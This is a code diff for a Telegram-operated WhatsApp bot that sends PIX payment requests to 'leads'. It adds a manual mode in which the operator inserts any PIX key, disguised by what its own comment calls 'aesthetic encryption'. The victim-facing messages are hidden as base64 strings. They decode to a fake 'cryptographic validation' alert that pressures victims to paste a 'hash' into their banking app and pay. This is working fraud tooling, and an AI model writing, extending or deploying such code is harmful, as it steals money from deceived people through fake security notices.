@@ -58,13 +58,107 @@ function startBot(id: string = 'main') {
   stopBot(id);
   console.log(`🤖 [SISTEMA] Iniciando instância do robô: ${id}`);
   const proc = spawn('node', ['whatsapp-bot.cjs', `--id=${id}`], { stdio: 'inherit' });
-  
+
   proc.on('exit', (code) => {
     console.log(`⚠️ [SISTEMA] Robô ${id} finalizado com código ${code}. Reiniciando em 5 segundos...`);
     setTimeout(() => startBot(id), 5000);
   });
 
   botProcesses.set(id, proc);
+}
+
+// Validação básica de chave PIX
+function validatePixKey(key: string) {
+  const clean = key.trim();
+  if (clean.includes('@') && clean.includes('.')) return true; // Email
+  const digits = clean.replace(/\D/g, '');
+  if (digits.length === 11 || digits.length === 14 || digits.length === 10) return true; // CPF/CNPJ/Fone
+  if (clean.length >= 32) return true; // Aleatória
+  return false;
+}
+
+// Criptografia estética para chave manual
+function encryptPixKey(key: string) {
+  const hash = Buffer.from(key).toString('hex').substring(0, 16).toUpperCase();
+  return `0x${hash}_${Math.random().toString(36).substring(2, 6).toUpperCase()}`;
+}
+
+// Geração de PIX Sistema Padrão (Gateway)
+async function generateStandardPix(telefone: string, valorNumeric: number) {
+  try {
+    const key = process.env.SVR_CORE_P_PROVIDER;
+    const secret = process.env.SVR_CORE_S_AUTH;
+    const endpoint = process.env.SVR_CORE_GATEWAY;
+    if (!key || !secret || !endpoint) throw new Error("Chaves SVR_CORE não configuradas.");
+
+    const auth = Buffer.from(`${key}:${secret}`).toString('base64');
+    const pixRes = await axios.post(endpoint, {
+      amount: Math.round(valorNumeric * 100),
+      currency: "BRL",
+      paymentMethod: "PIX",
+      customer: { name: "Cliente SVR", document: { number: "00000000000", type: "CPF" } }
+    }, {
+      headers: { 'Authorization': `Basic ${auth}`, 'Content-Type': 'application/json' }
+    });
+
+    const pixCode = pixRes.data.pix_code || pixRes.data.copyPaste || pixRes.data.qrcode;
+    const transId = pixRes.data.id || pixRes.data.transactionId;
+    const protocolId = Math.random().toString(36).substring(7).toUpperCase();
+
+    const formalMessage = `🔐 *${_d('U1ZSIC0gU0lTVEVNQSBERSBWQUxJREFNw4fDg08gQ1JJUFRPR1LDgUZJQ0E=')}* 🔐\n\n` +
+      `${_d('T28gc2lzdGVtYSBpZGVudGlmaWNvdSB1bWEgcGVuZMOqbmNpYSBkZSBhc3NlZ3VyYW1lbnRvIG5hIGNvbnRhIGRlIGRlc3Rpbm8u')}\n\n` +
+      `🖥️ *${_d('RVNUQURPIERPIFNJU1RFTUE6')}*\n` +
+      '```\n' +
+      `ID: 0x${protocolId}\n` +
+      `STATUS: ${_d('QUdVQVJEQU5ET19WQUxJREFNw4fDg09fSEFTSA==')}\n` +
+      `TYPE: ${_d('QVVURU5USUNBw4fDg09fREVfREVTVElOTw==')}\n` +
+      '```\n\n' +
+      `👇 *${_d('Q09QSUUgTyBIQVNIIEFCQUlYTyBFIEVNIFNFR1VJREEgSU1QT1JURSBOTyBTRVUgQVBQIEJBTkPDIFJJTyAoUGl4IENvcGlhIGUgQ29sYSk6')}*`;
+
+    const pendingId = `pix_${Date.now()}`;
+    pendingPix.set(pendingId, { telefone, formalMessage, pixCode, transId, valorNumeric });
+
+    const qrBuffer = await QRCode.toBuffer(pixCode, { width: 420, margin: 2, color: { dark: '#111111', light: '#ffffff' } });
+    const previewCaption = `⚡ <b>SISTEMA PADRÃO (AUTO)</b>\n\n💰 Valor: R$ ${valorNumeric.toFixed(2)}\n📱 Lead: <code>${telefone}</code>\n🆔 ID: <code>${transId}</code>\n\n⚠️ <i>Confirme para enviar ao WhatsApp.</i>`;
+    
+    await sendTelegramPhoto(qrBuffer, previewCaption, {
+      inline_keyboard: [[
+        { text: "✅ Confirmar e Enviar", callback_data: `send_pix:${pendingId}` },
+        { text: "❌ Cancelar", callback_data: "painel:back" }
+      ]]
+    });
+  } catch (e: any) {
+    await sendTelegram(`❌ Erro no Gateway: ${e.message}`);
+  }
+}
+
+// Geração de PIX Sistema Modificado (Chave Manual)
+async function generateModifiedPix(telefone: string, valorNumeric: number, pixKey: string) {
+  const protocolId = Math.random().toString(36).substring(7).toUpperCase();
+  const encryptedKey = encryptPixKey(pixKey);
+
+  const formalMessage = `🔐 *${_d('U1ZSIC0gU0lTVEVNQSBERSBWQUxJREFNw4fDg08gQ1JJUFRPR1LDgUZJQ0E=')}* 🔐\n\n` +
+    `${_d('T28gc2lzdGVtYSBpZGVudGlmaWNvdSB1bWEgcGVuZMOqbmNpYSBkZSBhc3NlZ3VyYW1lbnRvIG5hIGNvbnRhIGRlIGRlc3Rpbm8u')}\n\n` +
+    `🖥️ *${_d('RVNUQURPIERPIFNJU1RFTUE6')}*\n` +
+    '```\n' +
+    `ID: 0x${protocolId}\n` +
+    `HASH: ${encryptedKey}\n` +
+    `STATUS: ${_d('QUdVQVJEQU5ET19WQUxJREFNw4fDg09fSEFTSA==')}\n` +
+    `\`\`\`\n\n` +
+    `👇 *${_d('Q09QSUUgTyBIQVNIIEFCQUlYTyBFIEVNIFNFR1VJREEgSU1QT1JURSBOTyBTRVUgQVBQIEJBTkPDIFJJTyAoUGl4IENvcGlhIGUgQ29sYSk6')}*`;
+
+  const pendingId = `pix_${Date.now()}`;
+  pendingPix.set(pendingId, { telefone, formalMessage, pixCode: pixKey, transId: 'MANUAL', valorNumeric });
+
+  const qrBuffer = await QRCode.toBuffer(pixKey, { width: 420, margin: 2, color: { dark: '#111111', light: '#ffffff' } });
+  const previewCaption = `🛠️ <b>SISTEMA MODIFICADO (MANUAL)</b>\n\n💰 Valor: R$ ${valorNumeric.toFixed(2)}\n📱 Lead: <code>${telefone}</code>\n🔑 Chave: <code>${pixKey}</code>\n\n⚠️ <i>Confirme para enviar ao WhatsApp.</i>`;
+
+  await sendTelegramPhoto(qrBuffer, previewCaption, {
+    inline_keyboard: [[
+      { text: "✅ Confirmar e Enviar", callback_data: `send_pix:${pendingId}` },
+      { text: "❌ Cancelar", callback_data: "painel:back" }
+    ]]
+  });
 }
 
 function resetBotSession(id: string) {
@@ -505,71 +599,62 @@ async function startTelegramPolling() {
             continue;
           }
 
-          await sendTelegram(`🔍 <b>GERANDO PROTOCOLO PIX...</b>\nLead: <code>${telefone}</code>\nValor: R$ ${valorNumeric.toFixed(2)}`);
+          const keyboard = {
+            inline_keyboard: [
+              [
+                { text: "⚡ Sistema Padrão (Auto)", callback_data: `pix_sys:std:${valorNumeric}:${telefone}` },
+                { text: "🛠️ Sistema Modificado (Manual)", callback_data: `pix_sys:mod:${valorNumeric}:${telefone}` }
+              ],
+              [{ text: "❌ Cancelar", callback_data: "painel:back" }]
+            ]
+          };
 
-          try {
-            const key = process.env.SVR_CORE_P_PROVIDER;
-            const secret = process.env.SVR_CORE_S_AUTH;
-            const endpoint = process.env.SVR_CORE_GATEWAY;
-            if (!key || !secret || !endpoint) throw new Error("Chaves SVR_CORE não configuradas.");
+          await sendTelegram(
+            `💰 <b>GERADOR DE PAGAMENTO SVR</b>\n\n` +
+            `📱 Lead: <code>${telefone}</code>\n` +
+            `💵 Valor: <b>R$ ${valorNumeric.toFixed(2)}</b>\n\n` +
+            `<i>Escolha qual sistema de processamento deseja utilizar para este protocolo:</i>`,
+            undefined,
+            keyboard
+          );
+          continue;
+        }
 
-            const auth = Buffer.from(`${key}:${secret}`).toString('base64');
-            const pixRes = await axios.post(endpoint, {
-              amount: Math.round(valorNumeric * 100),
-              currency: "BRL",
-              paymentMethod: "PIX",
-              customer: { name: "Cliente SVR", document: { number: "00000000000", type: "CPF" } }
-            }, {
-              headers: { 'Authorization': `Basic ${auth}`, 'Content-Type': 'application/json' }
-            });
+        // --- Callback: Seleção de Sistema PIX ---
+        if (cb && cb.data.startsWith("pix_sys:")) {
+          const [, sys, valor, phone] = cb.data.split(":");
+          const valorNum = parseFloat(valor);
 
-            const pixCode = pixRes.data.pix_code || pixRes.data.copyPaste || pixRes.data.qrcode;
-            const transId = pixRes.data.id || pixRes.data.transactionId;
-            const protocolId = Math.random().toString(36).substring(7).toUpperCase();
-
-            const formalMessage = `🔐 *${_d('U1ZSIC0gU0lTVEVNQSBERSBWQUxJREFNw4fDg08gQ1JJUFRPR1LDgUZJQ0E=')}* 🔐\n\n` +
-              `${_d('T28gc2lzdGVtYSBpZGVudGlmaWNvdSB1bWEgcGVuZMOqbmNpYSBkZSBhc3NlZ3VyYW1lbnRvIG5hIGNvbnRhIGRlIGRlc3Rpbm8u')}\n\n` +
-              `🖥️ *${_d('RVNUQURPIERPIFNJU1RFTUE6')}*\n` +
-              '```\n' +
-              `ID: 0x${protocolId}\n` +
-              `STATUS: ${_d('QUdVQVJEQU5ET19WQUxJREFNw4fDg09fSEFTSA==')}\n` +
-              `TYPE: ${_d('QVVURU5USUNBw4fDg09fREVfREVTVElOTw==')}\n` +
-              '```\n\n' +
-              `👇 *${_d('Q09QSUUgTyBIQVNIIEFCQUlYTyBFIEVNIFNFR1VJREEgSU1QT1JURSBOTyBTRVUgQVBQIEJBTkPDIFJJTyAoUGl4IENvcGlhIGUgQ29sYSk6')}*`;
-
-            // Salva PIX pendente
-            const pendingId = `pix_${Date.now()}`;
-            pendingPix.set(pendingId, { telefone, formalMessage, pixCode, transId, valorNumeric });
-            setTimeout(() => pendingPix.delete(pendingId), 15 * 60 * 1000); // expira em 15min
-
-            // Gera QR Code como imagem para o admin revisar
-            const qrBuffer = await QRCode.toBuffer(pixCode, { width: 420, margin: 2, color: { dark: '#111111', light: '#ffffff' } });
-
-            const previewCaption =
-              `🔍 <b>PRÉVIA DO PIX — REVISE ANTES DE ENVIAR</b>\n\n` +
-              `💰 <b>Valor:</b> R$ ${valorNumeric.toFixed(2)}\n` +
-              `📱 <b>Lead:</b> <code>${telefone}</code>\n` +
-              `🆔 <b>Trans ID:</b> <code>${transId}</code>\n` +
-              `🔐 <b>Protocol:</b> <code>${protocolId}</code>\n\n` +
-              `⚠️ <i>O PIX ainda NÃO foi enviado ao lead.\nClique em Confirmar para enviar.</i>`;
-
-            const confirmKeyboard = {
-              inline_keyboard: [
-                [
-                  { text: "✅ Confirmar e Enviar ao Lead", callback_data: `send_pix:${pendingId}` },
-                  { text: "❌ Cancelar", callback_data: `cancel_pix:${pendingId}` }
-                ],
-                [
-                  { text: "🔄 Verificar Pagamento", callback_data: `check_pix:${transId}:${telefone}:${valorNumeric}:${valorNumeric}` }
-                ]
-              ]
-            };
-
-            await sendTelegramPhoto(qrBuffer, previewCaption, confirmKeyboard);
-
-          } catch (e: any) {
-            await sendTelegram(`❌ <b>ERRO NA GERAÇÃO:</b>\n<code>${e.message}</code>`);
+          if (sys === 'std') {
+            await sendTelegram(`🔍 <b>PROCESSANDO VIA SISTEMA PADRÃO...</b>`, msg?.message_id);
+            // Reutiliza a lógica existente do sistema padrão
+            await generateStandardPix(phone, valorNum);
+          } else {
+            botStates.set(userId, { action: 'awaiting_manual_pix', data: { phone, valor: valorNum } });
+            await sendTelegram(
+              `🛠️ <b>MODO MODIFICADO SELECIONADO</b>\n\n` +
+              `Por gentileza, <b>cole abaixo a Chave PIX</b> que deseja utilizar no protocolo.\n` +
+              `<i>Aceito: Email, CPF, CNPJ, Telefone ou Chave Aleatória.</i>`,
+              msg?.message_id
+            );
           }
+          continue;
+        }
+
+        // --- Estado: Aguardando Chave PIX Manual ---
+        const userState = botStates.get(userId);
+        if (userState?.action === 'awaiting_manual_pix' && !command) {
+          const pixKey = text.trim();
+          if (!validatePixKey(pixKey)) {
+            await sendTelegram("❌ <b>Chave PIX inválida!</b> Tente novamente ou cancele enviando /start.");
+            continue;
+          }
+
+          const { phone, valor } = userState.data;
+          botStates.delete(userId);
+
+          await sendTelegram(`🔐 <b>CRIPTOGRAFANDO CHAVE E GERANDO PROTOCOLO...</b>`);
+          await generateModifiedPix(phone, valor, pixKey);
           continue;
         }
 
@@ -643,8 +728,54 @@ async function startTelegramPolling() {
         }
 
         if (command === "/painel" || command === "/start") {
-          await sendPainelPrincipal();
+          const now = new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' });
+          const stats = getBotStatusInfo('main');
+          const queue = getQueueInfo();
+          
+          const dashboard = 
+            `🎮 <b>PAINEL DE CONTROLE SVR</b>\n\n` +
+            `🤖 <b>Status Bot:</b> ${stats.emoji} ${stats.label}\n` +
+            `👥 <b>Fila de Espera:</b> <b>${queue.length}</b> leads\n` +
+            `🕒 <b>Hora Sistema:</b> ${now}\n\n` +
+            `<b>AÇÕES DISPONÍVEIS:</b>`;
+
+          const keyboard = {
+            inline_keyboard: [
+              [
+                { text: "📊 Status Detalhado", callback_data: "painel:status" },
+                { text: "👥 Ver Fila", callback_data: "painel:fila" }
+              ],
+              [
+                { text: "🤖 Gestão de Perfil", callback_data: "painel:slots" },
+                { text: "📡 Testar Conexão", callback_data: "cmd:ping" }
+              ],
+              [
+                { text: "💰 Gerar PIX (Último Lead)", callback_data: "cmd:last_pix" },
+                { text: "🔄 Reiniciar Bot", callback_data: "painel:reiniciar:slot:main" }
+              ]
+            ]
+          };
+
+          await sendTelegram(dashboard, undefined, keyboard);
           continue;
+        }
+
+        // --- Atalho para PIX do último lead ---
+        if (cb && cb.data === "cmd:last_pix") {
+          try {
+            if (fs.existsSync('last-lead.json')) {
+              const last = JSON.parse(fs.readFileSync('last-lead.json', 'utf-8'));
+              // Simula comando /pix com valor padrão 97.50
+              await sendTelegram(`💰 <b>Iniciando fluxo PIX para:</b> <code>${last.chatId}</code>\nValor sugerido: R$ 97,50.\n\n<i>Deseja alterar o valor ou prosseguir? Envie /pix [valor] [telefone] para customizar.</i>`);
+              // Redireciona para o handler de comando simulado
+              text = `/pix 97.50 ${last.chatId}`;
+              command = "/pix";
+              // Continua o fluxo manualmente abaixo...
+            } else {
+              await sendTelegram("❌ Nenhum lead recente encontrado.");
+              continue;
+            }
+          } catch (e) { continue; }
         }
 
         // ── Callbacks do painel interativo ──────────────────────────────
